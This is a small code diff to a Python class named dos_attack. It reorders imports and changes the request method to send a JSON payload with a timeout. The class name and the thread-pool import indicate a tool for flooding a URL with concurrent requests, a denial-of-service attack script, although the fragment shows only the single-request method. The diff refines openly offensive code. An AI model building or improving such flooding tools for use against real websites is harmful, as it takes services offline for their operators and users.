@@ -1,5 +1,6 @@
-import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
+import requests
 
 class dos_attack:
     def __init__(self, url, i):
@@ -9,7 +10,7 @@ class dos_attack:
 
     def send_request(self):                         # Sends single request
         try:
-            response = requests.post(self.url, data=self.payload)
+            response = requests.post(self.url, json=self.payload, timeout=5)
             return response.status_code
         except Exception as e:
             return f"Error: {e}"
